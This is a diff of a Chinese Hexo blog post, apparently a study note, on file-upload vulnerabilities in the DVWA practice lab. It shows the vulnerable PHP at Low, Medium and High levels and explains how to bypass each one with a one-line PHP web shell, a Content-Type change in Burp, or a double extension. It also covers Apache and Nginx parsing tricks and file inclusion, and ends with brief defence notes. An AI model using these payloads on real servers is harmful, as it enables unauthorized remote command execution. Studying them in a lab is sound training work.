@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="日常学习,">
 
 
 
@@ -79,12 +79,13 @@
 
 
 
-<meta name="description" content="#文件上传 ##概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 ##DVWA文件">
+<meta name="description" content="文件上传概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 DVWA文件上传LOW先">
+<meta name="keywords" content="日常学习">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传">
 <meta property="og:url" content="http://yoursite.com/2019/02/24/文件上传/index.html">
 <meta property="og:site_name" content="W1cked">
-<meta property="og:description" content="#文件上传 ##概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 ##DVWA文件">
+<meta property="og:description" content="文件上传概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 DVWA文件上传LOW先">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.imgur.com/dtYR03v.png">
 <meta property="og:image" content="https://i.imgur.com/n8kO9om.png">
@@ -92,10 +93,10 @@
 <meta property="og:image" content="https://i.imgur.com/r7b3P0U.png">
 <meta property="og:image" content="https://i.imgur.com/r4G6EWw.png">
 <meta property="og:image" content="https://i.imgur.com/xtJNihy.png">
-<meta property="og:updated_time" content="2019-02-24T05:59:56.308Z">
+<meta property="og:updated_time" content="2019-03-05T14:18:10.346Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件上传">
-<meta name="twitter:description" content="#文件上传 ##概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 ##DVWA文件">
+<meta name="twitter:description" content="文件上传概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 DVWA文件上传LOW先">
 <meta name="twitter:image" content="https://i.imgur.com/dtYR03v.png">
 
 
@@ -366,99 +367,19 @@
       
 
       
-        <p>#文件上传</p>
-<p>##概述<br>Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。</p>
-<p>##DVWA文件上传</p>
-<p>###LOW<br>先看一下源码<br><br>     &lt;?php<br>    if (isset($_POST[‘Upload’])) {</p>
-<pre><code>    $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
-    $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
-
-    if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
-
-        echo &apos;&lt;pre&gt;&apos;;
-        echo &apos;Your image was not uploaded.&apos;;
-        echo &apos;&lt;/pre&gt;&apos;;
-
-      } else {
-
-        echo &apos;&lt;pre&gt;&apos;;
-        echo $target_path . &apos; succesfully uploaded!&apos;;
-        echo &apos;&lt;/pre&gt;&apos;;
-
-    }
-
-}
-</code></pre><p>?&gt; <br><br>DVWA_WEB_PAGE_TO_ROOT为网页的根目录，target_path变量为上传文件的绝对路径，basename( $_FILES[‘uploaded’][‘name’])将文件中已经“uploaded”的文件的名字取出并加入到target_path变量中。if语句判断文件是否上传到指定的路径中，若没有则显示没有上传。总的可见，此级别没有对上传文件的类型进行任何的过滤，也就是可以随意上传php文件。<br><br>所以直接上传一个一句话木马<code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code><img src="https://i.imgur.com/dtYR03v.png" alt><img src="https://i.imgur.com/n8kO9om.png" alt>他这里可以直接看到路径加上cmd参数可以直接使用命令。</p>
-<p>###Medium<br>查看源码<br>     &lt;?php<br>    if (isset($_POST[‘Upload’])) {</p>
-<pre><code>    $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
-    $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
-    $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
-    $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];
-    $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];
-
-    if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){
-
-
-        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
-
-            echo &apos;&lt;pre&gt;&apos;;
-            echo &apos;Your image was not uploaded.&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;
-
-          } else {
-
-            echo &apos;&lt;pre&gt;&apos;;
-            echo $target_path . &apos; succesfully uploaded!&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;
-
-            }
-    }
-    else{
-        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
-    }
-}
-</code></pre><p>?&gt; <br><br>这里较low增加了<br><code>$uploaded_name = $_FILES[&#39;uploaded&#39;][&#39;name&#39;];
-        $uploaded_type = $_FILES[&#39;uploaded&#39;][&#39;type&#39;];
-        $uploaded_size = $_FILES[&#39;uploaded&#39;][&#39;size&#39;];</code><br>文件名，文件类型，文件大小<img src="https://i.imgur.com/iVUsC4f.png" alt>这里直接上传就传不上去了<br><br>因为在if语句中判断上传文件的类型是否为“image/jpeg”和大小是否小于100kb。这里也只是简单地设置检测文件的类型，因此可以通过burpsuite来修改文件的类型进行过滤即可。<br><img src="https://i.imgur.com/r7b3P0U.png" alt><br>将content-type:改为image/jpeg可和上面一样得到路径。</p>
-<p>###High<br>查看源码<br>     &lt;?php<br>if (isset($_POST[‘Upload’])) {</p>
-<pre><code>    $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
-    $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
-    $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
-    $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);
-    $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];
-
-    if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){
-
-
-        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
-
-            echo &apos;&lt;pre&gt;&apos;;
-            echo &apos;Your image was not uploaded.&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;
-
-          } else {
-
-            echo &apos;&lt;pre&gt;&apos;;
-            echo $target_path . &apos; succesfully uploaded!&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;
-
-            }
-    }
-
-    else{
-
-        echo &apos;&lt;pre&gt;&apos;;
-        echo &apos;Your image was not uploaded.&apos;;
-        echo &apos;&lt;/pre&gt;&apos;;
-
-    }
-}
-</code></pre><p>?&gt; <br><br>通过这句<br><code>$uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000</code><br>可知high级别限制了文件后缀名可以继续用burp改包。<img src="https://i.imgur.com/r4G6EWw.png" alt>或者直接把1.php的文件名改为1.php.jpg也可以传上去</p>
-<p>##利用</p>
-<p>###1、结合解析漏洞：<br><br>1、直接解析（几乎没有防御）：<br><br>比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。<br><br>2、配合解析(有一定程度的防御)：<br><br>可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。<br><br>(1)、本地文件包含解析：主要是PHP本地文件包含<br><br>(2)、.htaccess文件解析<br><br>(3)、Web应用程序解析漏洞以及其原理：<br>1.Apache 解析漏洞：<br>解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称）<br>描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。2.Nginx 解析漏洞：<br>解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名）<br>描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p>
-<p>###2、结合文件包含漏洞：<br><img src="https://i.imgur.com/xtJNihy.png" alt><br>首先上传一个1.txt的文件<code>&lt;?php phpinfo();?&gt;</code>在文件包含漏洞中会将该文件以PHP来运行。</p>
-<p>##检测方法<br><strong>直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测</strong></p>
-<p>##防御方法<br>搬运<br><br>1、客户端JavaScript检测：通常为检测文件扩展名)<br>2、服务端MIME 类型检测：检测Content-Type内容)<br>3、服务端目录路径检测：检测跟path参数相关的内容<br>4、服务端文件扩展名检测：检测跟文件extension 相关的内容<br><br>目前防御方法学习还没有进行完还需要继续学习。</p>
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。</p>
+<h2 id="DVWA文件上传"><a href="#DVWA文件上传" class="headerlink" title="DVWA文件上传"></a>DVWA文件上传</h2><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><p>先看一下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"> </span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line"> </span><br><span class="line">            if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">              &#125; else &#123;</span><br><span class="line">            </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>DVWA_WEB_PAGE_TO_ROOT为网页的根目录，target_path变量为上传文件的绝对路径，basename( $_FILES[‘uploaded’][‘name’])将文件中已经“uploaded”的文件的名字取出并加入到target_path变量中。if语句判断文件是否上传到指定的路径中，若没有则显示没有上传。总的可见，此级别没有对上传文件的类型进行任何的过滤，也就是可以随意上传php文件。<br><br>所以直接上传一个一句话木马<code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code><img src="https://i.imgur.com/dtYR03v.png" alt><img src="https://i.imgur.com/n8kO9om.png" alt>他这里可以直接看到路径加上cmd参数可以直接使用命令。</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"> </span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"> </span><br><span class="line">            if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这里较low增加了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">   $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">   $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br></pre></td></tr></table></figure></p>
+<p>文件名，文件类型，文件大小<img src="https://i.imgur.com/iVUsC4f.png" alt>这里直接上传就传不上去了<br><br>因为在if语句中判断上传文件的类型是否为“image/jpeg”和大小是否小于100kb。这里也只是简单地设置检测文件的类型，因此可以通过burpsuite来修改文件的类型进行过滤即可。<br><img src="https://i.imgur.com/r7b3P0U.png" alt><br>将content-type:改为image/jpeg可和上面一样得到路径。</p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"> </span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"> </span><br><span class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>通过这句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000</span><br></pre></td></tr></table></figure></p>
+<p>可知high级别限制了文件后缀名可以继续用burp改包。<img src="https://i.imgur.com/r4G6EWw.png" alt>或者直接把1.php的文件名改为1.php.jpg也可以传上去</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="1、结合解析漏洞："><a href="#1、结合解析漏洞：" class="headerlink" title="1、结合解析漏洞："></a>1、结合解析漏洞：<br></h3><p>1、直接解析（几乎没有防御）：<br><br>比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。<br><br>2、配合解析(有一定程度的防御)：<br><br>可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。<br><br>(1)、本地文件包含解析：主要是PHP本地文件包含<br><br>(2)、.htaccess文件解析<br><br>(3)、Web应用程序解析漏洞以及其原理：<br>1.Apache 解析漏洞：<br>解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称）<br>描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。2.Nginx 解析漏洞：<br>解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名）<br>描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p>
+<h3 id="2、结合文件包含漏洞："><a href="#2、结合文件包含漏洞：" class="headerlink" title="2、结合文件包含漏洞："></a>2、结合文件包含漏洞：</h3><p><img src="https://i.imgur.com/xtJNihy.png" alt><br>首先上传一个1.txt的文件<code>&lt;?php phpinfo();?&gt;</code>在文件包含漏洞中会将该文件以PHP来运行。</p>
+<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p><strong>直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测</strong></p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>搬运<br><br>1、客户端JavaScript检测：通常为检测文件扩展名)<br>2、服务端MIME 类型检测：检测Content-Type内容)<br>3、服务端目录路径检测：检测跟path参数相关的内容<br>4、服务端文件扩展名检测：检测跟文件extension 相关的内容<br><br>目前防御方法学习还没有进行完还需要继续学习。</p>
 
       
     </div>
@@ -473,6 +394,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/日常学习/" rel="tag"># 日常学习</a>
+          
+        </div>
       
 
       
@@ -547,8 +474,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -572,11 +508,36 @@
             
 
             
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
 
           </nav>
 
           
 
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/W1cked" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:w8961519@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
           
 
           
@@ -590,6 +551,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传"><span class="nav-number">1.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#概述"><span class="nav-number">1.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA文件上传"><span class="nav-number">1.2.</span> <span class="nav-text">DVWA文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LOW"><span class="nav-number">1.2.1.</span> <span class="nav-text">LOW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium"><span class="nav-number">1.2.2.</span> <span class="nav-text">Medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High"><span class="nav-number">1.2.3.</span> <span class="nav-text">High</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、结合解析漏洞："><span class="nav-number">1.3.1.</span> <span class="nav-text">1、结合解析漏洞：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、结合文件包含漏洞："><span class="nav-number">1.3.2.</span> <span class="nav-text">2、结合文件包含漏洞：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测方法"><span class="nav-number">1.4.</span> <span class="nav-text">检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御方法"><span class="nav-number">1.5.</span> <span class="nav-text">防御方法</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
